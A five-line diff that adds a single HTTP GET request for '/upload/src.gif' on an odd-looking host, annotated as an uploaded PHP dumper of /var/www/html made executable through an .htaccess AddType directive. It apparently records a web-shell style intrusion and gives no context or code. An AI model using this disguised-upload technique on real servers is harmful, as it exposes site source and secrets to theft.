@@ -1,0 +1,5 @@
+﻿GET /upload/src.gif HTTP/1.1
+Host: pv5cl84fwfwuwkuz.neu-nex.fun
+
+(uploaded PHP dumper of /var/www/html via .htaccess AddType)
+
